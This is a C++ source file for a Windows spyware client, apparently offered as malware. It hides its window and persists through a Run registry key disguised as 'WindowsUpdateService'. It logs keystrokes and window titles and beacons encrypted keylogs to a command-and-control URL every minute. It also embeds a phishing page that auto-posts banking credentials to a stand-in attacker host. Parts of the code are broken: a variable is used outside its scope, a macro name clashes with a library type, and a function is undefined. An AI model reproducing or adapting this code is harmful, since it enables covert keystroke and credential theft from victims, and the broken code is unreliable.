// CLIENT (Windows C++ - Compile with: g++ -o client.exe client.cpp -lcurl -lcrypto -static)
#include <Windows.h>
#include <fstream>
#include <curl/curl.h>
#include <openssl/aes.h>
#include <thread>
#include <chrono>

#define C2_URL "https://YOUR_C2_IP:443/beacon"
#define AES_KEY "MRMONSIFH4CK3R420"

// Fake bank injection page - would replace legitimate banking sites
const char* FAKE_BANK_HTML = R"(
<html>
<body onload="document.login.submit()">
    <form name="login" action="http://malicious-phish.com/steal" method="POST">
        <input type="hidden" name="username" value="USER_AUTOFILL">
        <input type="hidden" name="password" value="PASS_AUTOFILL">
    </form>
</body>
</html>
)";

// XOR obfuscation for strings
void xor_obfuscate(char* data, size_t len, const char* key) {
    size_t keylen = strlen(key);
    for(size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}

// AES encryption wrapper
std::string aes_encrypt(const std::string& plaintext) {
    AES_KEY encrypt_key;
    AES_set_encrypt_key((const unsigned char*)AES_KEY, 128, &encrypt_key);
    
    std::string ciphertext;
    ciphertext.resize(plaintext.size() + AES_BLOCK_SIZE);
    
    int len = 0;
    AES_encrypt((const unsigned char*)plaintext.c_str(), 
                (unsigned char*)&ciphertext[0], 
                &encrypt_key);
    
    return base64_encode(ciphertext);
}

// Persistence via registry
void install_persistence() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
}

// Keylogger thread
void keylogger() {
    char prev_title[256] = "";
    std::string log_buffer;
    
    while(true) {
        HWND foreground = GetForegroundWindow();
        if(foreground) {
            char title[256];
            GetWindowTextA(foreground, title, 256);
            
            if(strcmp(title, prev_title) != 0) {
                sprintf(prev_title, "[WINDOW: %s]\n", title);
                log_buffer += prev_title;
            }
            
            for(int key = 8; key <= 255; key++) {
                if(GetAsyncKeyState(key) & 0x0001) {
                    char c = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
                    log_buffer += c;
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide window
    install_persistence();
    std::thread(keylogger).detach();
    
    char client_id[17];
    sprintf(client_id, "%08X%08X", GetTickCount(), GetCurrentProcessId());
    
    while(true) {
        CURL* curl = curl_easy_init();
        if(curl) {
            std::string payload = std::string(client_id) + "|SYSTEM_INFO|KEYLOGS:" + log_buffer;
            std::string encrypted = aes_encrypt(payload);
            
            curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encrypted.c_str());
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            
            CURLcode res = curl_easy_perform(curl);
            if(res == CURLE_OK) {
                // Process command response here
            }
            curl_easy_cleanup(curl);
            log_buffer.clear();
        }
        Sleep(60000); // Beacon every 60s
    }
    return 0;
}